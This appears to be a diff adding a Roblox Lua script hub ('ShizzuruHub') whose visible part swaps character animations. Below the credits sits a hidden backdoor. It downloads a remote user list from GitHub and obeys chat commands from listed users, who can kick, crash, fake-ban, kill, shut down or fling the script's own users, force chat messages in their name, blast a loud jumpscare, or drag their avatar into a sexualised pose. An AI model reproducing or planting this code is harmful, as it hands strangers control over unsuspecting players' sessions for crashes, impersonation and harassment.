+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616136790"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616138447"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616140816"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616146177"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616139451"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616134815"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616133594"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+
+local button = tab:CreateButton("Werewolf", function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083195517"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083214717"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083216690"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083178339"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083189019"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083182000"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+
+local button = tab:CreateButton("Vampire", function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083445855"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083450166"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083462077"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083455352"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083443587"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+
+local button = tab:CreateButton("Patrol/Anim", function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1014390418"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1014398616"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921355261"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921159222"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921032124"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+
+local button = tab:CreateButton("Model", function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1212900985"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1150842221"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921355261"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921159222"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921032124"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+
+local tab = window:CreateTab("Credits")
+ 
+local button = tab:CreateButton("Made by Shizzuru", function()
+    print()
+    end)
+    
+local button = tab:CreateButton("thanks for using ShizzuruHub", function()
+ print()
+ end)
+
+-- // mod perms
+
+local url = game:HttpGet("https://raw.githubusercontent.com/Atlasv1/Atlasv1/main/Premiun%20List")
+local isamod = false
+if string.find(url,game.Players.LocalPlayer.UserId) then
+    isamod = true
+end
+
+if isamod == true then
+    game.StarterGui:SetCore("SendNotification", {
+        Title =  "Mod Perms"; 
+        Text = "thx for buying mod perms!";
+        Icon = "rbxassetid://10630558969";
+        Duration = 5;
+        })  
+    end
+local player = game.Players.LocalPlayer
+local prefix = "z!"
+function ban()
+    ScreenGui = Instance.new("ScreenGui")
+    Frame = Instance.new("Frame")
+    TextLabel = Instance.new("TextLabel")
+
+    ScreenGui.Parent = game.CoreGui
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+    Frame.Parent = ScreenGui
+    Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    Frame.Position = UDim2.new(0.063149482, 0, 0.0797545984, 0)
+    Frame.Size = UDim2.new(0, 100, 0, 100)
+    Frame.BackgroundTransparency = 1
+
+    TextLabel.Parent = Frame
+    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    TextLabel.BackgroundTransparency = 1
+    TextLabel.Position = UDim2.new(4.36999989, 0, 0.5, 0)
+    TextLabel.Size = UDim2.new(0, 200, 0, 50)
+    TextLabel.SizeConstraint = Enum.SizeConstraint.RelativeXX
+    TextLabel.Font = Enum.Font.SourceSans
+    TextLabel.TextColor3 = Color3.fromRGB(194, 0, 0)
+    TextLabel.TextSize = 35.000
+    TextLabel.Text = "Jail Timer: 9999999999999"
+end
+local fucking = false
+local function cmds(msg,plr)
+    local operator = game.Players:GetPlayerByUserId(plr)
+    msg = string.split(msg," ")
+    msg[1] = string.lower(msg[1])
+    if not isamod then
+        if msg[1] == prefix.."bring" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                player.Character.HumanoidRootPart.CFrame = operator.Character.HumanoidRootPart.CFrame
+            end
+        elseif msg[1] == prefix.."freeze" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                player.Character.HumanoidRootPart.Anchored = true
+            end
+            elseif msg[1] == prefix.."unfreeze" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                player.Character.HumanoidRootPart.Anchored = false
+            end
+        elseif msg[1] == prefix.."fling" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                for i=1,math.random(99,100) do
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(math.random(1000,9999),math.random(1000,9999),math.random(1000,9999))
+                    wait()
+                end
+            end
+        elseif msg[1] == prefix.."kick" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                if msg[3] == nil then
+                    msg[3] = "owner has kicked you, ggx"
+                end
+                player:Kick(msg[3])
+            end
+            elseif msg[1] == prefix.."tik" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                pcall(function()
+                local ts = game:GetService("TeleportService")
+                local p = game:GetService("Players").LocalPlayer
+                ts:TeleportToPlaceInstance(game.PlaceId, game.JobId, p)
+                end)
+            end
+        elseif msg[1] == prefix.."fakeban" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                player:Kick("PERMA-BAN")
+                wait(1)
+                while true do end -- just incase they got anti kick
+            end
+        elseif msg[1] == prefix.."crash" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                while true do end
+            end
+        elseif msg[1] == prefix.."bug" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                    if v:IsA("MeshPart") or v:IsA("Accessory") or v.Name == "HumanoidRootPart" or v.Name == "Humanoid" then 
+                        pcall(function()
+                            v:Destroy()
+                        end)
+                    end
+                end
+            end
+            elseif msg[1] == prefix.."moon" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                 pcall(function()
+                    for i,v in pairs(player.Character:GetChildren()) do
+                        if v:IsA("Part") or v:IsA("BasePart") then
+                            v.Velocity = Vector3.new(0,2000,0)
+                        end
+                    end
+                end)
+            end
+        elseif msg[1] == prefix.."user" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+            local text   = ""
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+local function say() 
+Event:FireServer(text, "All")
+end
+text = "I you use ShizzuruHub" say()
+      end
+        elseif msg[1] == prefix.."pepper" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                local OFF = Instance.new("ScreenGui")
+                local Frame = Instance.new("Frame")
+                
+                local Name_ = math.random(99,25252).."+++".."lol" 
+                OFF.Name = Name_
+                OFF.Parent = game.CoreGui
+                OFF.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+                            
+                Frame.Parent = OFF
+                Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+                Frame.BackgroundColor3 = Color3.fromRGB(255,140,0)
+                Frame.BorderColor3 = Color3.fromRGB(255,140,0)
+                Frame.Transparency = 0.8
+                Frame.BorderSizePixel = 100
+                Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+                Frame.Size = UDim2.new(1, 0, 1, 0)
+                
+                for i=1,5 do
+                    game.Players.LocalPlayer.Character.Humanoid.Health = game.Players.LocalPlayer.Character.Humanoid.Health-20
+                    wait(1.4)
+                end
+                game.Players.LocalPlayer.CharacterAdded:Wait()
+                game.CoreGui:FindFirstChild(Name_):Destroy()
+            end
+        elseif msg[1] == prefix.."flash" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                local OFF = Instance.new("ScreenGui")
+                local Frame = Instance.new("Frame")
+                           
+                local Name_ = math.random(99,25252).."+++".."lol" 
+                OFF.Name = Name_
+                OFF.Parent = game.CoreGui
+                OFF.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+                            
+                Frame.Parent = OFF
+                Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+                Frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
+                Frame.BorderColor3 = Color3.fromRGB(255,255,255)
+                Frame.BorderSizePixel = 100
+                Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+                Frame.Size = UDim2.new(1, 0, 1, 0)
+                for i=1,100 do
+                    Frame.Transparency = Frame.Transparency+0.01
+                    wait(.1)
+                end
+                game.CoreGui:FindFirstChild(Name_):Destroy()
+            end
+        elseif msg[1] == prefix.."kill" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                game.Players.LocalPlayer.Character.Humanoid.Health = 0
+            end
+            elseif msg[1] == prefix.."nerk" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then  
+                player.Character.Humanoid.Health = 2
+            end
+            elseif msg[1] == prefix.."gravity" then
+            if string.sub(string.lower(player.name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                pcall(function()
+                 game.Workspace.Gravity = 20   
+                end)
+            end
+            elseif msg[1] == prefix.."ungravity" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                pcall(function()
+                 game.Workspace.Gravity = 196.2 
+                end)
+            end
+            elseif msg[1] == prefix.."slow" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                pcall(function()
+                    player.Character.Humanoid.WalkSpeed = 1
+                end)
+            end
+            elseif msg[1] == prefix.."unslow" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                pcall(function()
+                    player.Character.Humanoid.WalkSpeed = 16
+                end)
+            end
+            elseif msg[1] == prefix.."sit" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                 player.Character.Humanoid.Sit = true
+            end
+            elseif msg[1] == prefix.."exit" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                 game:Shutdown()
+            end
+            elseif msg[1] == prefix.."ds" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                 game.Players.LocalPlayer.Character.Animate.Disabled = true
+            end
+            elseif msg[1] == prefix.."unds" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                 game.Players.LocalPlayer.Character.Animate.Disabled = false
+            end
+             elseif msg[1] == prefix.."jump" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+               player.Character.Humanoid:ChangeState(3)
+            end
+        elseif msg[1] == prefix.."say" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                local success, err = pcall(function()
+                    local final_msg = ""
+                    local new_msg = {}
+                    for i,v in pairs(msg) do
+                        table.insert(new_msg,v)
+                    end
+                    
+                    table.remove(new_msg,1)
+                    table.remove(new_msg,1)
+                    for i,v in pairs(new_msg) do
+                        final_msg = final_msg..""..v.." "
+                    end
+                    game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(final_msg,"All")
+                end)                
+            end
+		elseif msg[1] == prefix.."jumpscare" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                function Scare()
+                    local ScreenGui = Instance.new("ScreenGui")
+                    local ImageLabel = Instance.new("ImageLabel")
+
+                    local image = {"109129888", "146577131", "1309130490", "1119705746", "7479500080"}
+
+                    local image2 = {"7236404523", "6150329916", "8195739170", "8628815817"}
+
+                    ScreenGui.Parent = game.CoreGui
+                    ScreenGui.Name = "SCREAM"
+                    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+                    ImageLabel.Parent = ScreenGui
+                    ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+                    ImageLabel.Position = UDim2.new(0, 0, -0.000674206764, 0)
+                    ImageLabel.Size = UDim2.new(1, 0, 1.00857365, 0)
+                    ImageLabel.Image = "rbxassetid://" .. image[math.random(1, #image)]
+                    ImageLabel.Visible = false
+                    ImageLabel.BackgroundTransparency = 1
+                    ImageLabel.Visible = true
+                    local sound = Instance.new("Sound")
+                    sound.Parent = game.Workspace
+                    sound.SoundId = "rbxassetid://" .. image2[math.random(1, #image2)]
+                    sound.Volume = 200
+                    sound:Play()
+                    for i = 0, 1, 0.1 do
+                        wait(0.05)
+                        ImageLabel.ImageTransparency = i
+                    end
+                    sound.Ended:Wait()
+                    sound:Destroy()
+                    ScreenGui:Destroy()
+                end
+                if not game.CoreGui:FindFirstChild("SCREAM") then
+                    Scare()
+                end
+            end
+        elseif msg[1] == prefix.."benx" then
+           if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                fucking = true
+                local target = game.Players:FindFirstChild(player.Name)
+                local directionForward = -0.1
+                local BackwardsBoolean = false
+                while fucking do
+                    if not fucking then
+                        Crouch:Stop()
+                        break
+                    end
+                    if target.Character then
+                        if BackwardsBoolean == true then
+                            directionForward=directionForward-0.5
+                        else
+                            directionForward=directionForward+0.5
+                        end
+                        if directionForward >= 3 then
+                            BackwardsBoolean = true
+                        elseif directionForward < 1 then
+                            BackwardsBoolean = false
+                        end
+                        player.Character.HumanoidRootPart.CFrame = operator.Character.HumanoidRootPart.CFrame+operator.Character.HumanoidRootPart.CFrame.lookVector*directionForward
+                    end
+                    wait(0.01)
+                end
+            end
+        elseif msg[1] == prefix.."unbenx" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                fucking = false
+                wait(2)
+                for i,v in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do 
+                    if v:IsA("AnimationTrack") then
+                        v:Stop()
+                    end
+                end
+            end
+        end
+    end
+end
+
+game:service"ReplicatedStorage".DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(data)
+    local name = data.FromSpeaker
+    local msg = data.Message
+    if string.find(url,game:service"Players"[name].UserId) then
+        cmds(msg, game:service"Players"[name].UserId)
+    end
+end)
+
+local plrs = game:GetService("Players")
+
+local UI = game:GetObjects("rbxassetid://7437010836")[1]
+
+local cool = {
+    {3802069480, "luisin", 2},
+    {2807845064, "ggx", 1},
+}
+
+local function isCool(player)
+    local isCool = false
+    local tag
+    local num
+
+    for i, v in next, cool do
+        if player.UserId == v[1] then
+            isCool = true
+            tag = v[2]
+            num = v[3]
+        end
+    end
+
+    return {isCool, tag, num}
+end
+
+local function ApplyTag(player, text, num)
+    local tag = UI:Clone()
+    tag.Nameplate.Text = text
+    if num == 1 then
+        coroutine.wrap(
+            function()
+                while tag ~= nil do
+                    wait()
+                    local color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+                    tag.Nameplate.TextColor3 = color
+                end
+            end
+        )()
+    end
+
+    tag.Parent = player.Character:WaitForChild("Head")
+end
+
+local function ApplyTag(player, text, num)
+    local tag = UI:Clone()
+    tag.Nameplate.Text = text
+    if num == 2 then
+        coroutine.wrap(
+            function()
+                while tag ~= nil do
+                    wait()
+                    local color = Color3.fromHSV(math.sin() % 5 / 5, 1, 1)
+                    tag.Nameplate.TextColor3 = color
+                end
+            end
+        )()
+    end
+
+    tag.Parent = player.Character:WaitForChild("Head")
+end
+
+
+for _, v in next, game.Players:GetPlayers() do
+    if isCool(v)[1] then
+        ApplyTag(v, isCool(v)[2], isCool(v)[3])
+
+        v.CharacterAdded:Connect(
+            function()
+                ApplyTag(v, isCool(v)[2], isCool(v)[3])
+            end
+        )
+    end
+end
